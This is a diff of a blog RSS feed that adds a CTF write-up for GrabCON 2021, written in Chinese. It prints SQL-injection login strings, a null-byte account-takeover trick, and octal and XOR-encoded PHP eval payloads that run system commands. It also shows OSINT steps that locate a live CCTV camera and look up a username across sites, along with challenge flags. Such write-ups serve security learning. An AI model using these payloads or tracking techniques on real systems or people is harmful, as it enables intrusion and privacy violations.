@@ -1,4 +1,148 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 05 Sep 2021 11:09:54 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>SSCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</link><pubDate>Sun, 05 Sep 2021 11:09:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</guid><description>&lt;p>&lt;a href="https://research.samsung.com/sstf">https://research.samsung.com/sstf&lt;/a>&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 07 Sep 2021 11:22:14 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
+&lt;blockquote>
+&lt;p>Hack admin user!&lt;/p>
+&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>万能密码 &lt;code>username=admin&amp;amp;password=%27%3D%27&lt;/code>&lt;/p>
+&lt;p>&lt;code>GrabCON{E4sy_pe4sy_SQL_1nj3ct10n}&lt;/code>&lt;/p>
+&lt;h2 id="webdoor-lock">Web/Door Lock&lt;/h2>
+&lt;blockquote>
+&lt;p>The door is open to all! See who is behind the admin door??&lt;/p>
+&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>和上面那个一样的前端页面，但是很显然万能密码失效，随便登入一个号，有水平越权&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904212157898.png" alt="image-20210904212157898">&lt;/p>
+&lt;p>用burp跑一下&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906134840366.png" alt="image-20210906134840366">&lt;/p>
+&lt;p>&lt;code>GrabCON{E4sy_1D0R_}&lt;/code>&lt;/p>
+&lt;h2 id="webnull-food-factory">Web/Null Food Factory&lt;/h2>
+&lt;blockquote>
+&lt;p>Prove your hacking skill to get admin panel.&lt;/p>
+&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>还是一模一样的前端，目标还是以admin登入&lt;/p>
+&lt;p>用到的是Null byte injection，先以&lt;code>admin%00&lt;/code>为用户名注册&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105417519.png" alt="image-20210907105417519">&lt;/p>
+&lt;p>然后用Admin的名字登入&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105241455.png" alt="image-20210907105241455">&lt;/p>
+&lt;p>&lt;code>GrabCON{Null_byt3s_1s_L0v3}&lt;/code>&lt;/p>
+&lt;h2 id="webbasic-calc">Web/Basic Calc&lt;/h2>
+&lt;blockquote>
+&lt;p>Ever used calc based on php?&lt;/p>
+&lt;p>Author: &lt;strong>karma&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
+&lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[A-Za-z`]+/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$eq&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;BAD.&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Result: &amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; ;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在看到php的题感觉那是相当的亲切了……&lt;/p>
+&lt;p>虽然是直接有了eval，但是这个正则过滤的有点狠，字母全被ban掉 就只能用xor或八进制的方式来把字母搞出来&lt;/p>
+&lt;p>八进制版本：&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\154\163&amp;quot;)
+// &amp;quot;system&amp;quot;(&amp;quot;ls&amp;quot;)
+&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164&amp;quot;)
+// &amp;quot;system(&amp;quot;cat /flagggg.txt&amp;quot;)&amp;quot;
+&lt;/code>&lt;/pre>&lt;p>xor&lt;/p>
+&lt;pre tabindex="0">&lt;code>Ouput:
+(&amp;quot;system&amp;quot;)(&amp;quot;cat /flagggg.txt&amp;quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907111823056.png" alt="image-20210907111823056">&lt;/p>
+&lt;p>&lt;code>GrabCON{b4by_php_f0r_y0u}&lt;/code>&lt;/p>
+&lt;p>参考： &lt;a href="https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/">https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/&lt;/a> | &lt;a href="https://ctf.0xff.re/2021/uiuctf_2021/phpfuck">https://ctf.0xff.re/2021/uiuctf_2021/phpfuck&lt;/a> | &lt;a href="https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md">https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md&lt;/a> | &lt;a href="https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264">https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264&lt;/a>&lt;/p>
+&lt;h2 id="osintprotondate">OSINT/ProtonDate&lt;/h2>
+&lt;blockquote>
+&lt;p>Can you find the date, when was this email created?&lt;/p>
+&lt;p>sc4ry_gh0st@protonmail[dot]com&lt;/p>
+&lt;p>GrabCON{dd_mm_yyyy}&lt;/p>
+&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>说实话 是纯猜的&lt;/p>
+&lt;p>&lt;code>GrabCON{03_09_2021}&lt;/code>&lt;/p>
+&lt;p>但是看了wp之后发现这确实有正规的做法，一个开源工具叫&lt;a href="https://github.com/pixelbubble/ProtOSINT">ProtOSINT&lt;/a>，所使用的api如下&lt;/p>
+&lt;pre tabindex="0">&lt;code>https://api.protonmail.ch/pks/lookup?op=index&amp;amp;search=sc4ry_gh0st@protonmail.com
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906131321553.png" alt="image-20210906131321553">拿到时间戳1630658267，即Fri 3 September 2021 08:37:47 UTC&lt;/p>
+&lt;h2 id="osintvictim-1">OSINT/Victim 1&lt;/h2>
+&lt;blockquote>
+&lt;p>We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?&lt;/p>
+&lt;p>&lt;a href="http://31.207.115.133:8080/cgi-bin/faststream.jpg?stream=half&amp;amp;fps=15&amp;amp;rand=COUNTER">Live Camera&lt;/a>&lt;/p>
+&lt;p>GrabCON{zipcode}&lt;/p>
+&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>给了一个摄像头的地址，用&lt;a href="https://www.iplocation.net/ip-lookup">IP geolocation lookup&lt;/a>查一下地点&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906210732263.png" alt="image-20210906210732263">&lt;/p>
+&lt;p>画面右上有个在动的缆车&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211008725.png" alt="image-20210906211008725">&lt;/p>
+&lt;p>zipcode: 39031&lt;/p>
+&lt;p>&lt;code>GrabCON{39031}&lt;/code>&lt;/p>
+&lt;h2 id="osintwebsite">OSINT/Website&lt;/h2>
+&lt;blockquote>
+&lt;p>My friend is having a website named, &amp;ldquo;Great Animals Here&amp;rdquo;. He have leaked the flag on his website. Can you find the flag?&lt;/p>
+&lt;p>Hint: He used free website builder tool to create his site. greatanimalshere&lt;/p>
+&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;a href="https://greatanimalshere.weebly.com/">https://greatanimalshere.weebly.com/&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101731335.png" alt="image-20210907101731335">&lt;/p>
+&lt;h2 id="osintthe-tour1">OSINT/The Tour(1)&lt;/h2>
+&lt;blockquote>
+&lt;p>w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?&lt;/p>
+&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211622007.png" alt="image-20210906211622007">&lt;/p>
+&lt;p>空的，试一下wayback machine&lt;/p>
+&lt;pre tabindex="0">&lt;code>https://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/
+&lt;/code>&lt;/pre>&lt;p>也是空的，用&lt;a href="https://github.com/sherlock-project/sherlock">sherlock&lt;/a>查一下&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906214255872.png" alt="image-20210906214255872">&lt;/p>
+&lt;p>后面的内容可以&lt;a href="https://kashmir54.github.io/ctfs/GrabCON/#the-tour1">详见wp&lt;/a>了，很少做OSINT，但是感觉好有意思，就是找的好麻烦，脑洞好大，不容易啊&lt;/p>
+&lt;h2 id="osintthe-tour2">OSINT/The Tour(2)&lt;/h2>
+&lt;blockquote>
+&lt;p>Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}&lt;/p>
+&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>wp-&amp;gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2&lt;/p>
+&lt;h2 id="miscwelcome">Misc/Welcome&lt;/h2>
+&lt;blockquote>
+&lt;p>GrabCON{welcome_to_grabcon_2021}&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;code>GrabCON{welcome_to_grabcon_2021}&lt;/code>&lt;/p>
+&lt;h2 id="miscdiscord">Misc/Discord&lt;/h2>
+&lt;blockquote>
+&lt;p>Join our &lt;a href="https://discord.gg/8F9VMVCWb2">discord&lt;/a> server!&lt;/p>
+&lt;/blockquote>
+&lt;p>憨批机器人，我没搞明白这个是怎么玩的&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905092539802.png" alt="image-20210905092539802">&lt;/p>
+&lt;p>tmd 试了好久 结果竟然在#role&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906121117043.png" alt="image-20210906121117043">&lt;/p>
+&lt;p>&lt;code>GrabCON{s@n1ty_fl4g_1s_here}&lt;/code>&lt;/p>
+&lt;p>fxxxk&lt;/p>
+&lt;h2 id="miscyoutube">Misc/YouTube&lt;/h2>
+&lt;blockquote>
+&lt;p>Find us on YouTube.&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;code>GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}&lt;/code>&lt;/p>
+&lt;h2 id="miscfind-me">Misc/Find me&lt;/h2>
+&lt;blockquote>
+&lt;p>Checkout author&amp;rsquo;s social media.&lt;/p>
+&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905103746359.png" alt="image-20210905103746359">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101222360.png" alt="image-20210907101222360">&lt;/p>
+&lt;p>&lt;code>GrabCON{n0_fl4g_h3r3}&lt;/code>&lt;/p>
+&lt;h2 id="cryptowarm-up">Crypto/Warm-up&lt;/h2>
+&lt;blockquote>
+&lt;p>Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.&lt;/p>
+&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;pre tabindex="0">&lt;code>file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)&amp;amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K
+&lt;/code>&lt;/pre>&lt;p>全部是b64加密 很简单了&lt;/p>
+&lt;p>&lt;code>GrabCON{dayuum_s0n!}&lt;/code>&lt;/p>
+&lt;hr>
+&lt;p>好菜好菜，开学了 奥里给&lt;/p></description></item><item><title>SSCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</link><pubDate>Sun, 05 Sep 2021 11:09:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</guid><description>&lt;p>&lt;a href="https://research.samsung.com/sstf">https://research.samsung.com/sstf&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://playground.sstf.site/challenges">https://playground.sstf.site/challenges&lt;/a>&lt;/p>
 &lt;h2 id="tutorialpractice-flag-submission">Tutorial/Practice: Flag Submission&lt;/h2>
 &lt;p>&lt;code>SCTF{It_15_tim3_t0_hack!!}&lt;/code>&lt;/p>
